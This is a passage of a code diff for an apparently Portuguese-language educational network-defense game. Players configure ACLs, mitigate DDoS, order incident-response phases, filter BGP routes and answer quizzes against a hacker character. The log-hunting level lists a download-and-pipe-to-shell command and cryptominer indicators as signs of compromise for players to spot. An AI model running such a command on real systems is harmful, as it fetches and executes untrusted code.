+  me: 'Ordem de regra é tudo. Deny específico primeiro.',
+  tip: 'Se o permit de 443 vier antes do bloqueio do atacante, ele entra pela 443. O deny any any sempre fecha a lista. Duas regras ali não fazem parte da política.',
+  learn: 'Regra mais específica primeiro, deny implícito ou explícito no final. "permit ip any any" anula tudo abaixo dela, e SSH liberado para any quebra a exigência de só gerência.',
+  html: `<div class="ord"><span class="n">1</span>[r1]</div><div class="ord"><span class="n">2</span>[r2]</div><div class="ord"><span class="n">3</span>[r3]</div><div class="ord"><span class="n">4</span>[r4]</div>`,
+  zones: { r1: ['att'], r2: ['web', 'ssh'], r3: ['web', 'ssh'], r4: ['deny'] },
+  chips: [
+    { t: 'deny ip host 45.67.89.10 any', v: 'att' },
+    { t: 'permit tcp any host 10.0.0.10 eq 443', v: 'web' },
+    { t: 'permit tcp 10.99.0.0/24 host 10.0.0.10 eq 22', v: 'ssh' },
+    { t: 'deny ip any any', v: 'deny' },
+    { t: 'permit ip any any', v: 'x1' },
+    { t: 'permit tcp any host 10.0.0.10 eq 22', v: 'x2' }
+  ] },
+
+{ act: 1, tag: 'CLI', type: 'drop', mode: 'slots', title: 'Monte a ACL',
+  goal: 'Complete a ACL que bloqueia a reflexão NTP e aplique na interface certa.',
+  intro: 'Ataque de <b>reflexão NTP</b> chegando pelo trânsito contra o bloco <b>177.10.0.0/22</b>. Bloqueie o UDP com <b>origem 123</b>, libere o resto e aplique na entrada do uplink.',
+  z: 'Milhares de servidores NTP respondendo pra você ao mesmo tempo. Monlist é lindo.',
+  me: 'Porta de origem 123, wildcard certa e ACL na entrada. Vamos lá.',
+  tip: 'Em ACL Cisco se usa wildcard, não máscara: /22 = 0.0.3.255. A porta 123 é a de ORIGEM, então o "eq" vem logo depois do "any". Tráfego que vem da internet entra pelo uplink.',
+  learn: 'Wildcard é o inverso da máscara: 255.255.252.0 vira 0.0.3.255. Em reflexão, a vítima recebe respostas vindas da porta do serviço abusado, por isso o filtro é na porta de origem. O ideal é ainda pedir ao upstream para filtrar antes do seu link.',
+  html: `<div class="cli">access-list 110 [a] [b] any [c] 177.10.0.0 [d]<br>access-list 110 [e] ip any any<br><span class="c">!</span><br>interface TenGigE0/0/0<br>&nbsp;description UPLINK-TRANSITO<br>&nbsp;ip access-group 110 [f]</div>`,
+  zones: { a: ['deny'], b: ['udp'], c: ['eq 123'], d: ['0.0.3.255'], e: ['permit'], f: ['in'] },
+  chips: ['deny', 'permit', 'udp', 'tcp', 'eq 123', 'eq 53', '0.0.3.255', '255.255.252.0', '0.0.1.255', 'in', 'out'] },
+
+{ act: 1, tag: 'QUIZ', type: 'quiz', title: 'Mitigação DDoS',
+  goal: 'Responda as questões de mitigação para segurar o ataque volumétrico.',
+  z: 'Agora é pra valer. Vou encher seus links até não caber mais nada.',
+  me: 'Volumétrico não se resolve na minha borda. Se resolve antes dela.',
+  tip: 'Pense em onde o tráfego é descartado. Se já chegou no seu uplink, o link já está cheio.',
+  learn: 'Camadas de defesa contra DDoS: SYN cookies no host, uRPF contra spoofing (BCP 38), ACL para reflexão, RTBH ou scrubbing no upstream para volumétrico.',
+  qs: [
+    { q: 'O servidor recebe milhões de SYN sem completar o handshake e a tabela de conexões lotou. Mitigação mais direta no host?', o: ['Habilitar SYN cookies', 'Aumentar o MTU da interface', 'Trocar TCP por UDP', 'Colocar o servidor atrás de NAT'], a: 0, why: 'SYN cookies evitam guardar estado até o ACK final chegar, então a tabela não enche.' },
+    { q: 'Chegam 80 Gbps de lixo contra um único IP de cliente num uplink de 10G. O que salva o resto da rede?', o: ['RTBH: anunciar o /32 com community de blackhole pro upstream', 'Criar uma ACL no roteador de borda', 'Reiniciar o roteador de borda', 'Aumentar o buffer da interface'], a: 0, why: 'Se o tráfego chegou no seu uplink, o link já saturou. Só o upstream descartando antes resolve. O RTBH sacrifica o IP alvo pra salvar o resto.' },
+    { q: 'Qual community BGP padronizada pela RFC 7999 sinaliza blackhole?', o: ['65535:666', '65535:65281', '0:0', '64512:100'], a: 0, why: 'BLACKHOLE é 65535:666. A 65535:65281 é a no-export.' },
+    { q: 'Numa amplificação DNS, qual a porta de ORIGEM do tráfego que chega na vítima?', o: ['UDP 53', 'TCP 53', 'UDP 123', 'Aleatória acima de 1024'], a: 0, why: 'As respostas saem dos resolvers abertos, então a origem é 53/UDP. Se fosse NTP, seria 123.' },
+    { q: 'Que recurso descarta pacotes com IP de origem forjado, sem rota de volta pela interface de entrada?', o: ['uRPF', 'Spanning Tree', 'LACP', 'VRRP'], a: 0, why: 'uRPF strict confere se a rota para o IP de origem sai pela mesma interface. É a base do BCP 38 contra spoofing.' }
+  ] },
+
+{ act: 2, tag: 'ORDENAÇÃO', type: 'drop', mode: 'slots', wide: true, title: 'Plano de resposta',
+  goal: 'Monte as fases de resposta a incidente na ordem do NIST SP 800-61.',
+  intro: 'Um servidor foi comprometido. A diretoria quer saber o plano. Ordene as fases de <b>resposta a incidente</b>.',
+  z: 'Já estou dentro. Vai fazer o quê, desligar tudo no desespero?',
+  me: 'Não. Vou seguir o processo, passo a passo.',
+  tip: 'Primeiro se prepara, depois detecta. Isolar vem antes de limpar, e limpar vem antes de voltar pra produção. Aprender fica no final.',
+  learn: 'Ciclo do NIST: preparação, detecção e análise, contenção, erradicação, recuperação e atividades pós-incidente. Formatar sem análise destrói evidência e não diz por onde o invasor entrou, então ele volta.',
+  html: `<div class="ord"><span class="n">1</span>[s1]</div><div class="ord"><span class="n">2</span>[s2]</div><div class="ord"><span class="n">3</span>[s3]</div><div class="ord"><span class="n">4</span>[s4]</div><div class="ord"><span class="n">5</span>[s5]</div><div class="ord"><span class="n">6</span>[s6]</div>`,
+  zones: { s1: ['p'], s2: ['d'], s3: ['c'], s4: ['e'], s5: ['r'], s6: ['l'] },
+  chips: [
+    { t: 'Preparação: runbooks, backups, contatos', v: 'p' },
+    { t: 'Detecção e análise: logs, alertas, escopo', v: 'd' },
+    { t: 'Contenção: isolar a VLAN, bloquear o C2', v: 'c' },
+    { t: 'Erradicação: remover backdoor e contas', v: 'e' },
+    { t: 'Recuperação: restaurar e monitorar', v: 'r' },
+    { t: 'Lições aprendidas: pós-mortem', v: 'l' },
+    { t: 'Formatar tudo sem análise', v: 'x1' },
+    { t: 'Pagar o resgate', v: 'x2' }
+  ] },
+
+{ act: 2, tag: 'CAÇADA', type: 'drop', mode: 'buckets', title: 'Caça nos logs',
+  goal: 'Separe as linhas de log normais das suspeitas.',
+  intro: 'Você puxou os logs do servidor comprometido. Separe o que é <b>rotina</b> do que é <b>sinal de invasão</b>.',
+  z: 'Escondi meu rastro no meio do barulho. Boa sorte.',
+  me: 'Quem sabe o que é normal acha o anormal.',
+  tip: 'Procure: força bruta, download direto para shell, usuário novo com UID 0, processo estranho usando CPU e conexões para pools de mineração.',
+  learn: 'Indicadores clássicos de mineração: processo com nome falso (kdevtmpfsi, kinsing) comendo CPU, conexão de saída para portas 3333/4444, e download via curl ou wget direto para sh. UID 0 extra é backdoor de persistência.',
+  buckets: [
+    { label: 'NORMAL', c: '#00e0a8', a: ['Accepted publickey for noc from 10.99.0.15', 'BGP neighbor 200.1.1.1 state Established', 'systemd: Started Daily apt upgrade', 'DHCP: lease renovado para 10.0.5.23'] },
+    { label: 'SUSPEITO', c: '#ff4d6d', a: ['sshd: Failed password for root from 185.220.101.4 (847x em 2 min)', "processo 'kdevtmpfsi' usando 390% de CPU", 'www-data executou: curl http://45.9.148.99/x.sh | sh', "useradd: novo usuário 'sysupdate' com UID 0", 'conexão de saída para 91.x.x.x:3333 (pool)'] }
+  ] },
+
+{ act: 2, tag: 'VLSM', type: 'drop', mode: 'slots', title: 'Reconstruir a rede',
+  goal: 'Reenderece a rede limpa com VLSM, do maior para o menor.',
+  intro: 'Rede limpa, hora de reconstruir. Bloco <b>10.50.0.0/24</b>. Aloque com <b>VLSM do maior para o menor</b>, sem desperdício.',
+  z: 'Mesmo que você limpe tudo, não vai conseguir reendereçar a tempo.',
+  me: 'VLSM, do maior pro menor. Sem sobrar buraco.',
+  tip: '100 hosts cabem numa /25 (126). 50 numa /26 (62). 20 numa /27 (30). Link ponto a ponto de 2 hosts numa /30. Cada rede começa onde a anterior terminou.',
+  learn: 'Vendas 10.50.0.0/25 (0-127), TI 10.50.0.128/26 (128-191), Diretoria 10.50.0.192/27 (192-223), Link 10.50.0.224/30 (224-227). Alocar do maior para o menor evita sobreposição e buracos.',
+  html: `<div class="grid3"><div class="h">SETOR</div><div class="h">REDE 10.50.0.x</div><div class="h">PREFIXO</div>
+<div>Vendas<br><small style="color:var(--muted)">100 hosts</small></div>[v1][v2]
+<div>TI<br><small style="color:var(--muted)">50 hosts</small></div>[t1][t2]
+<div>Diretoria<br><small style="color:var(--muted)">20 hosts</small></div>[d1][d2]
+<div>Link P2P<br><small style="color:var(--muted)">2 hosts</small></div>[l1][l2]</div>`,
+  zones: { v1: ['.0'], v2: ['/25'], t1: ['.128'], t2: ['/26'], d1: ['.192'], d2: ['/27'], l1: ['.224'], l2: ['/30'] },
+  chips: ['.0', '.128', '.192', '.224', '.100', '.200', '.240', '/25', '/26', '/27', '/30', '/24', '/28', '/29'] },
+
+{ act: 2, tag: 'CHEFE FINAL', type: 'quiz', boss: true, time: 15, title: 'Confronto: Z3R0',
+  goal: 'Z3R0 está ao vivo no seu terminal. Acerte 7 perguntas antes que ele derrube a rede. 15 segundos por pergunta.',
+  z: 'Chega de joguinho. Eu contra você, ao vivo. Cada erro seu e eu derrubo mais um POP.',
+  me: 'Pode vir. Eu conheço essa rede melhor que você.',
+  tip: 'Cada acerto tira um pedaço da vida do Z3R0. Cada erro ou tempo esgotado tira 20% da sua integridade.',
+  learn: 'Z3R0 foi rastreado, o C2 caiu e os IPs estão em blackhole. A rede está de pé porque o plantão sabia o básico muito bem: física, endereçamento, firewall e processo.',
+  qs: [
+    { q: 'Quantos hosts úteis tem uma /27?', o: ['30', '32', '14', '62'], a: 0, why: '2^5 = 32 endereços, menos rede e broadcast: 30.' },
+    { q: 'Qual a wildcard de uma /22?', o: ['0.0.3.255', '255.255.252.0', '0.0.1.255', '0.0.7.255'], a: 0, why: 'Máscara 255.255.252.0 invertida: 0.0.3.255.' },
+    { q: 'O BGP estabelece sessão em qual porta?', o: ['TCP 179', 'UDP 179', 'TCP 161', 'UDP 520'], a: 0, why: 'BGP roda sobre TCP 179. UDP 520 é o RIP.' },
+    { q: 'Qual flag TCP inicia uma conexão?', o: ['SYN', 'ACK', 'FIN', 'RST'], a: 0, why: 'Handshake: SYN, SYN-ACK, ACK.' },
+    { q: 'Um switch L2 encaminha quadros em qual camada OSI?', o: ['Enlace (2)', 'Rede (3)', 'Física (1)', 'Transporte (4)'], a: 0, why: 'Switch L2 decide por endereço MAC, camada de enlace.' },
+    { q: 'Qual é a faixa reservada para CGNAT?', o: ['100.64.0.0/10', '172.16.0.0/12', '100.0.0.0/8', '169.254.0.0/16'], a: 0, why: 'RFC 6598: 100.64.0.0/10. A 169.254 é link-local.' },
+    { q: 'Qual protocolo descobre o MAC a partir do IP no IPv4?', o: ['ARP', 'DNS', 'DHCP', 'ICMP'], a: 0, why: 'ARP resolve IPv4 para MAC.' },
+    { q: 'E no IPv6, quem faz esse papel?', o: ['NDP (Neighbor Discovery)', 'ARPv6', 'DHCPv6', 'MLD'], a: 0, why: 'IPv6 usa NDP sobre ICMPv6 (Neighbor Solicitation e Advertisement).' },
+    { q: 'Melhor prática para acesso de gerência aos equipamentos?', o: ['SSH com chave e ACL restringindo a origem', 'Telnet com senha forte', 'SSH aberto para 0.0.0.0/0 com senha admin', 'HTTP com autenticação básica'], a: 0, why: 'Criptografia, autenticação forte e superfície de ataque reduzida pela ACL.' },
+    { q: 'Qual ataque envenena a tabela ARP para ficar no meio do tráfego?', o: ['ARP spoofing (MITM)', 'SYN flood', 'Amplificação DNS', 'Smurf'], a: 0, why: 'ARP spoofing. Mitigação: DHCP snooping + Dynamic ARP Inspection.' }
+  ] }
+];
+
+const EXTRA = [
+  { loc: 'rack', cap: 'Correndo até o rack do datacenter...', heads: ['SEU EQUIPAMENTO', 'ONDE LIGAR'], loose: true },
+  { loc: 'desk', cap: 'Abrindo os logs no terminal...' },
+  { loc: 'desk', cap: 'Planejando a segmentação da rede...' },
+  { loc: 'firewall', cap: 'Revisando os serviços expostos...', heads: ['SERVIÇO', 'PORTA PADRÃO'] },
+  { loc: 'firewall', cap: 'Conectando no console do firewall...' },
+  { loc: 'firewall', cap: 'Auditando a ordem das regras...' },
+  { loc: 'rack', cap: 'Plugando o cabo console no roteador de borda...' },
+  { loc: 'war', cap: 'Correndo para o painel de tráfego...' },
+  { loc: 'desk', cap: 'Abrindo o plano de resposta a incidente...' },
+  { loc: 'server', cap: 'Acessando o servidor comprometido...' },
+  { loc: 'desk', cap: 'Reconstruindo o endereçamento...' },
+  { loc: 'war', cap: 'Z3R0 invadiu o telão do NOC!' }
+];
+LEVELS.forEach((L, i) => Object.assign(L, EXTRA[i]));
+LEVELS.slice(8).forEach(L => { L.act = 3; });
+const NEWLV = [
+{ act: 2, tag: 'SWITCHING', type: 'drop', mode: 'slots', title: 'VLAN hopping', loc: 'rack', cap: 'Indo até o switch de acesso...',
+  goal: 'Configure a porta da câmera como access e o uplink como trunk blindado contra VLAN hopping.',
+  intro: 'Câmera na <b>VLAN 30</b> na Gi1/0/10. Uplink para o core só com as VLANs <b>10, 20 e 30</b>. Native VLAN numa VLAN sem uso e nada de negociação automática.',
+  z: 'Seu switch negocia trunk com qualquer um. Vou pular direto pra VLAN de gerência.',
+  me: 'Access é access, trunk é trunk. E DTP desligado.',
+  tip: 'Porta de host é access. Uplink é trunk com lista explícita de VLANs. Native VLAN fora de uso (ex.: 999) e nonegotiate desligam o DTP.',
+  learn: 'VLAN hopping acontece por switch spoofing (DTP formando trunk com o atacante) ou double tagging (usando a native VLAN). Defesa: portas de host em access fixo, switchport nonegotiate, trunk com allowed vlan explícito e native VLAN que não carrega usuário.',
+  html: `<div class="cli">interface Gi1/0/10<br>&nbsp;description CAMERA-PORTARIA<br>&nbsp;switchport mode [a]<br>&nbsp;switchport access vlan [b]<br><span class="c">!</span><br>interface Te1/0/1<br>&nbsp;description UPLINK-CORE<br>&nbsp;switchport mode [c]<br>&nbsp;switchport trunk allowed vlan [d]<br>&nbsp;switchport trunk native vlan [e]<br>&nbsp;switchport [f]</div>`,
+  zones: { a: ['access'], b: ['30'], c: ['trunk'], d: ['10,20,30'], e: ['999'], f: ['nonegotiate'] },
+  chips: ['access', 'trunk', 'dynamic desirable', '30', '1', '10,20,30', 'all', '999', 'nonegotiate', 'port-security'] },
+{ act: 2, tag: 'BGP', type: 'drop', mode: 'buckets', title: 'Filtro de cliente BGP', loc: 'desk', cap: 'Abrindo a sessão BGP do cliente AS65010...',
+  goal: 'Decida o que aceitar do cliente BGP AS65010, dono do bloco 45.160.0.0/22.',
+  intro: 'Cliente <b>AS65010</b> tem o bloco <b>45.160.0.0/22</b> com ROA até <b>/24</b>. Aceite só o que é dele. O resto é leak ou sequestro.',
+  z: 'Vou anunciar pelo seu cliente o que eu quiser. Você aceita tudo mesmo.',
+  me: 'Cliente BGP só anuncia o que é dele. Prefix-list estrita.',
+  tip: '45.160.0.0/22 cobre de 45.160.0.0 a 45.160.3.255. Aceite só prefixos dentro disso entre /22 e /24. Default route, bogons, seus próprios prefixos e blocos de terceiros são rejeitados.',
+  learn: 'Filtro de cliente = prefix-list 45.160.0.0/22 le 24. Rejeite default, RFC 1918, CGNAT, seus próprios blocos e qualquer coisa mais específica que /24, que a internet descarta. Some max-prefix e validação RPKI para fechar o cerco. É o que pede o MANRS.',
+  buckets: [
+    { label: 'ACEITAR', c: '#00e0a8', a: ['45.160.0.0/22', '45.160.0.0/23', '45.160.2.0/24', '45.160.3.0/24'] },
+    { label: 'REJEITAR', c: '#ff4d6d', a: ['0.0.0.0/0', '10.0.0.0/8', '100.64.0.0/10', '177.10.0.0/22 (seu bloco)', '8.8.8.0/24', '45.160.4.0/24', '45.160.1.0/25'] }
+  ] },
+{ act: 2, tag: 'QUIZ', type: 'quiz', title: 'Sequestro de prefixo', loc: 'war', cap: 'Alerta de rota no painel de BGP...',
+  goal: 'Z3R0 está anunciando seus prefixos na internet. Descubra como ele faz e como se defender.',
+  z: 'Anunciei um /24 do seu /22 lá fora. Todo o seu tráfego agora passa por mim.',
+  me: 'Longest match. Vou fechar essa brecha.',
+  tip: 'O roteador sempre prefere o prefixo mais específico. RPKI valida origem e tamanho máximo, mas não o caminho.',
+  learn: 'Hijack por mais específico ganha pelo longest prefix match. ROA com maxLength igual ao anúncio real faz o /24 falso virar RPKI invalid, e quem faz ROV descarta. Origem forjada passa no RPKI; aí entram ASPA e filtros de trânsito. Max-prefix protege contra route leak de cliente.',
+  qs: [
+    { q: 'Você anuncia 177.10.0.0/22. O Z3R0 anuncia 177.10.1.0/24 de outro AS. Para onde vai o tráfego destinado a 177.10.1.5?', o: ['Para o Z3R0, porque o /24 é mais específico', 'Para você, porque anunciou primeiro', 'Para quem tiver AS-path menor', 'Divide meio a meio'], a: 0, why: 'Longest prefix match vem antes de qualquer atributo do BGP. O /24 ganha do /22.' },
+    { q: 'Qual configuração de ROA faz o /24 falso ser marcado como inválido?', o: ['ROA 177.10.0.0/22 com maxLength /22', 'ROA 177.10.0.0/22 com maxLength /24', 'Sem ROA nenhum', 'ROA com maxLength /32'], a: 0, why: 'Com maxLength /22, qualquer anúncio mais específico que /22 é invalid, mesmo com origem certa.' },
+    { q: 'Se o Z3R0 anunciar o /22 forjando o SEU AS como origem, o RPKI ROV detecta?', o: ['Não. ROV só valida origem e tamanho, não o caminho', 'Sim, sempre', 'Sim, se tiver community', 'Só se for IPv6'], a: 0, why: 'Origem forjada passa no ROV. Para isso existem ASPA, BGPsec e filtros nos trânsitos.' },
+    { q: 'Seu cliente BGP vazou a tabela completa (900 mil rotas) pra você. O que teria derrubado a sessão antes do estrago?', o: ['maximum-prefix na sessão do cliente', 'Aumentar a memória do roteador', 'Community no-export', 'Local-preference alta'], a: 0, why: 'Max-prefix derruba a sessão quando o cliente passa do limite combinado. Proteção básica contra route leak.' }
+  ] }
+];
+LEVELS.splice(8, 0, ...NEWLV);
+['sfp', 'sfp', 'sfp', 'rj45', 'sc'].forEach((ic, k) => { LEVELS[0].right[k].ico = ic; });
+LEVELS[0].goal = 'Cada cabo tem um tipo. Ligue cada equipamento da esquerda na porta compatível da direita.';
+
+const ACTS = [['ATO 1', 'Camada física e endereçamento'], ['ATO 2', 'Firewall e DDoS'], ['ATO 3', 'Switching e BGP'], ['ATO 4', 'Resposta a incidente']];
+const TAUNT = ['Hahaha, errou feio!', 'Seu firewall é de papel?', 'Mais um erro e a rede é minha.', 'Nem o estagiário erra isso.', 'Tic tac, analista...', 'Obrigado pelo acesso!'];
+const PRAISE = ['Link UP!', 'Boa!', 'Na mosca.', 'Isso aí.', 'Perfeito.', 'Segue o baile.'];
+const ZHURT = ['Argh! Sorte sua.', 'Isso não vai durar.', 'Como você sabia?!', 'Meu C2 está caindo...'];
+
+// ---------- state ----------
+const S = { prog: {}, best: {}, cur: 0, hp: 100, err: 0, placed: 0, need: 0, sel: null, busy: false, pairs: [], wsel: null, timer: null, intro: [], score: 0, combo: 1 };
+try { S.prog = JSON.parse(localStorage.getItem('noc_prog') || '{}') || {}; S.best = JSON.parse(localStorage.getItem('noc_best') || '{}') || {}; } catch (e) {}
+const save = () => { try { localStorage.setItem('noc_prog', JSON.stringify(S.prog)); localStorage.setItem('noc_best', JSON.stringify(S.best)); } catch (e) {} };
+const K = i => LEVELS[i].title;
+const unlocked = i => i === 0 || (S.prog[K(i - 1)] || 0) > 0;
+
+function show(id) { document.querySelectorAll('.screen').forEach(s => s.classList.toggle('on', s.id === id)); }
+function modal(html) { $('mcard').innerHTML = html; $('modal').classList.add('on'); $('mcard').scrollTop = 0; }
+function closeModal() { $('modal').classList.remove('on'); }
+
+// ---------- map ----------
+function renderMap() {
+  let html = '', tot = 0, pts = 0, nextI = LEVELS.findIndex((L, i) => unlocked(i) && !S.prog[K(i)]);
+  ACTS.forEach((a, ai) => {
+    html += `<div class="acth"><span>${a[0]}</span><b>${a[1]}</b></div><div class="path">`;
+    LEVELS.forEach((L, i) => {
+      if (L.act !== ai) return;
+      const st = S.prog[K(i)] || 0; tot += st; pts += S.best[K(i)] || 0;
+      const lock = !unlocked(i), next = i === nextI;
+      const cls = ['node', lock ? 'lock' : '', st ? 'done' : '', next ? 'next' : '', L.boss ? 'boss' : ''].join(' ');
+      html += `<button class="${cls}" data-i="${i}"><span class="dot">${lock ? '×' : st ? '✓' : i + 1}</span>
+        <span class="info"><span class="tx"><b>${L.title}${next ? '<span class="tag">PRÓXIMO</span>' : ''}</b><small>${LOCNAME[L.loc]} · ${L.tag}</small></span>
+        ${lock ? '' : `<span class="res"><span class="st">${'★'.repeat(st)}${'☆'.repeat(3 - st)}</span>${S.best[K(i)] ? `<small>${fmt(S.best[K(i)])} pts</small>` : ''}</span>`}</span></button>`;
+    });
+    html += '</div>';
+  });
+  $('mapList').innerHTML = html;
+  $('starsTot').innerHTML = `★ ${tot}/${LEVELS.length * 3}<small>${fmt(pts)} PTS</small>`;
+}
+$('mapList').addEventListener('click', e => {
+  const b = e.target.closest('.node'); if (!b) return;
+  const i = +b.dataset.i;
+  if (!unlocked(i)) { buzz(30); return; }
+  au(); brief(i);
+});
+function brief(i) {
+  const L = LEVELS[i];
+  modal(`<div class="tag">${ACTS[L.act][0]} · ${LOCNAME[L.loc]}</div><h2>${i + 1}. ${L.title}</h2>
+    <div class="dlg"><div class="av">${AV_Z}</div><div class="bubble z"><span class="who">Z3R0</span>${L.z}</div></div>
+    <div class="dlg"><div class="av">${AV_ME}</div><div class="bubble me"><span class="who">VOCÊ</span>${L.me}</div></div>
+    <div class="goal"><b>Missão:</b> ${L.goal}</div>
+    <div class="row"><button class="btn ghostb" id="mCancel">VOLTAR</button><button class="btn" id="mGo">IR PARA ${L.loc === 'war' ? 'A SALA' : L.loc === 'desk' ? 'O TERMINAL' : L.loc === 'server' ? 'O SERVIDOR' : L.loc === 'firewall' ? 'O FIREWALL' : 'O RACK'}</button></div>`);
+  $('mCancel').onclick = closeModal;
+  $('mGo').onclick = () => { closeModal(); startLevel(i); };
+}
+
+// ---------- game core ----------
+function cleanup() {
+  clearInterval(S.timer); S.timer = null; S.intro.forEach(clearTimeout); S.intro = [];
+  S.sel = null; S.wsel = null; D = null; WD = null;
+  document.querySelectorAll('.ghost').forEach(g => g.remove());
+}
+function startLevel(i) {
+  cleanup();
+  const L = LEVELS[i];
+  Object.assign(S, { cur: i, hp: 100, err: 0, placed: 0, busy: true, pairs: [], score: 0, combo: 1 });
+  $('lvName').textContent = (i + 1) + '. ' + L.title;
+  setHP(); setScore();
+  $('stage').innerHTML = ''; $('bank').style.display = 'none';
+  $('stage').classList.add('veil'); $('bank').classList.add('veil');
+  show('game');
+  const sc = $('scene');
+  sc.innerHTML = sceneSVG(L.loc, L.boss, L.loose) + `<div class="caption"><i></i><span id="capTxt"></span></div><div class="skip">TOQUE PARA PULAR</div>`;
+  sc.classList.remove('defeat'); sc.classList.add('big');
+  heroTo(sc, 150, true);
+  const hero = sc.querySelector('.hero'); hero.classList.add('walk');
+  requestAnimationFrame(() => requestAnimationFrame(() => heroTo(sc, HX[L.loc])));
+  typeCap(L.cap);
+  music(L.boss ? 'boss' : 'play'); sfx.whoosh();
+  for (let k = 0; k < 8; k++) S.intro.push(setTimeout(sfx.step, k * 170));
+  for (let k = 0; k < 7; k++) S.intro.push(setTimeout(sfx.key, 1500 + k * 90 + Math.random() * 40));
+  if (L.boss) S.intro.push(setTimeout(sfx.siren, 300), setTimeout(sfx.siren, 1100));
+  S.intro.push(setTimeout(() => { hero.classList.remove('walk'); hero.classList.add('type'); }, 1420));
+  S.intro.push(setTimeout(finishIntro, 2300));
+  sc.onclick = () => { if (S.intro.length) finishIntro(); };
+}
+function typeCap(t) {
+  const el = $('capTxt'); let i = 0; el.textContent = '';
+  const iv = setInterval(() => { if (!el.isConnected) return clearInterval(iv); el.textContent = t.slice(0, ++i); if (i >= t.length) clearInterval(iv); }, 28);
+}
+function finishIntro() {
+  S.intro.forEach(clearTimeout); S.intro = [];
+  const L = LEVELS[S.cur], sc = $('scene'), hero = sc.querySelector('.hero');
+  heroTo(sc, HX[L.loc], true); hero.classList.remove('walk'); hero.classList.add('type');
+  $('capTxt').textContent = LOCNAME[L.loc] + (L.boss ? ' · Z3R0 AO VIVO' : '');
+  sc.classList.remove('big');
+  S.busy = false;
+  if (L.type === 'wire') renderWire(L);
+  else if (L.type === 'drop') renderDrop(L);
+  else renderQuiz(L);
+  requestAnimationFrame(() => { $('stage').classList.remove('veil'); $('bank').classList.remove('veil'); });
+  setTimeout(() => { if ($('wire')) drawWires(); }, 520);
+}
+function setHP() {
+  $('hpFill').style.width = S.hp + '%';
+  $('hpFill').classList.toggle('low', S.hp <= 40);
+  $('hpTxt').textContent = 'REDE ' + S.hp + '%';
+}
+function setScore() {
+  $('scoreTxt').textContent = fmt(S.score);
+  const c = $('comboTxt'); c.textContent = 'COMBO x' + S.combo;
+  c.classList.toggle('on', S.combo > 1);
+  c.classList.remove('pop'); void c.offsetWidth; if (S.combo > 1) c.classList.add('pop');
+}
+let toastT;
+function toast(msg, good) {
+  const t = $('toast');
+  $('toastAv').innerHTML = good ? AV_ME : AV_Z; $('toastTxt').textContent = msg;
+  t.className = 'toast show' + (good ? ' good' : '');
+  clearTimeout(toastT); toastT = setTimeout(() => { t.className = 'toast' + (good ? ' good' : ''); }, 1500);
+}
+function damage(n, at) {
+  S.err++; S.combo = 1; S.hp = Math.max(0, S.hp - n); setHP(); setScore();
+  sfx.bad(); if (S.hp <= 40) setTimeout(sfx.siren, 250); buzz(90); sceneFx('alarm', 900); heroState('hit', 450);
+  const st = $('stage'); st.classList.remove('shk'); void st.offsetWidth; st.classList.add('shk');
+  if (at) floatTxt(at.x, at.y, '-' + n + '%', '#ff4d6d');
+  toast(TAUNT[Math.random() * TAUNT.length | 0], false);
+  if (S.hp <= 0) { S.busy = true; clearInterval(S.timer); setTimeout(() => fail('A integridade da rede chegou a zero. O Z3R0 assumiu o controle.'), 650); }
+}
+function good(at, color) {
+  const pts = 100 * S.combo;
+  S.score += pts; sfx.ok(S.combo); S.combo = Math.min(5, S.combo + 1); setScore();
+  sceneFx('okf', 350); heroState('happy', 500);
+  if (at) { burst(at.x, at.y, color || '#00e0a8'); floatTxt(at.x, at.y - 10, '+' + pts, color || '#00e0a8'); }
+  if (Math.random() < .3) toast(PRAISE[Math.random() * PRAISE.length | 0], true);
+}
+function flash(el) { el.classList.remove('bad'); void el.offsetWidth; el.classList.add('bad'); setTimeout(() => el.classList.remove('bad'), 400); }
+function stars() { return S.err === 0 ? 3 : S.err <= 2 ? 2 : 1; }
+function win() {
+  cleanup(); S.busy = true;
+  const L = LEVELS[S.cur], st = stars(), bonus = S.hp * 5, total = S.score + bonus;
+  S.prog[K(S.cur)] = Math.max(S.prog[K(S.cur)] || 0, st);
+  S.best[K(S.cur)] = Math.max(S.best[K(S.cur)] || 0, total); save();
+  const last = S.cur === LEVELS.length - 1;
+  const hero = $('scene').querySelector('.hero');
+  let delay = 650;
+  if (L.boss) {
+    delay = 3600; stopMusic();
+    const sc = $('scene'); sc.classList.add('big', 'defeat'); $('stage').classList.add('veil');
+    if (hero) { hero.classList.remove('type'); }
+    const cap = $('capTxt'); if (cap) cap.textContent = 'C2 DESCONECTADO · Z3R0 OFFLINE';
+    sfx.zap(); setTimeout(sfx.boom, 250); buzz([100, 50, 200]);
+    setTimeout(() => { const c = center(sc); for (let k = 0; k < 5; k++) setTimeout(() => burst(c.x + (k - 2) * 60, c.y - 20, ['#ff2e63', '#ffd166', '#00e0a8', '#4dd2ff', '#ff7ad9'][k], 18), k * 120); }, 700);
+    setTimeout(() => { if (hero) hero.classList.add('cheer'); sfx.win(); }, 1300);
+    setTimeout(() => music('menu'), 3000);
+  } else {
+    sfx.win(); buzz([40, 60, 40]);
+    if (hero) { hero.classList.remove('type'); hero.classList.add('idle'); }
+    const c = center($('scene')); for (let k = 0; k < 3; k++) setTimeout(() => burst(c.x + (k - 1) * 80, c.y, ['#00e0a8', '#ffd166', '#4dd2ff'][k], 16), k * 150);
+  }
+  setTimeout(() => {
+    modal(`<div class="tag">${last ? 'FIM DE TURNO' : 'INCIDENTE CONTIDO'}</div><h2>${last ? 'Z3R0 derrotado!' : L.title}</h2>
+      <div class="bigstars">${[0, 1, 2].map(k => `<span>${k < st ? '★' : '☆'}</span>`).join('')}</div>
+      <div class="pts"><span>Acertos</span><b>${fmt(S.score)}</b></div>
+      <div class="pts"><span>Bônus integridade ${S.hp}%</span><b>+${fmt(bonus)}</b></div>
+      <div class="pts" style="color:var(--warn)"><span>TOTAL</span><b style="color:var(--warn)">${fmt(total)} pts</b></div>
+      <div class="learn"><b>${last ? 'RELATÓRIO FINAL' : 'O QUE VOCÊ DEFENDEU'}</b>${L.learn}</div>
+      ${last ? `<div class="dlg"><div class="av">${AV_ME}</div><div class="bubble me"><span class="who">VOCÊ</span>Turno encerrado. Pode ir dormir, Z3R0. Eu fico de olho.</div></div>` : ''}
+      <div class="row"><button class="btn ghostb" id="mMap">MAPA</button>${last ? `<button class="btn" id="mAgain">JOGAR DE NOVO</button>` : `<button class="btn" id="mNext">PRÓXIMA</button>`}</div>`);
+    $('mMap').onclick = () => { closeModal(); goMap(); };
+    if (last) $('mAgain').onclick = () => { closeModal(); startLevel(S.cur); };
+    else $('mNext').onclick = () => { closeModal(); brief(S.cur + 1); };
+  }, delay);
+}
+function fail(msg) {
